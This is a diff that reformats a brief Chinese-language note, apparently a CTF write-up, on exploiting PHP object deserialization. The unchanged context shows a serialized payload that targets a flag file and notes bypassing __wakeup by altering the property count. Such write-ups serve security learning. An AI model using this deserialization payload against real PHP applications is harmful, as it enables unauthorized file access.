@@ -1,4 +1,5 @@
-#PHP序列化 
+#PHP 序列化
+
 ```php
 <?php
 class X
@@ -29,6 +30,7 @@ if (isset($_REQUEST['x'])) {
 ```
 
 payload:
+
 ```php
 <?php
 class X
@@ -45,4 +47,5 @@ $a = new X($b);
 echo serialize($a);
 //O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}
 ```
-最后再修改属性个数绕过 `__wakeup` 
+
+最后再修改属性个数绕过 `__wakeup`
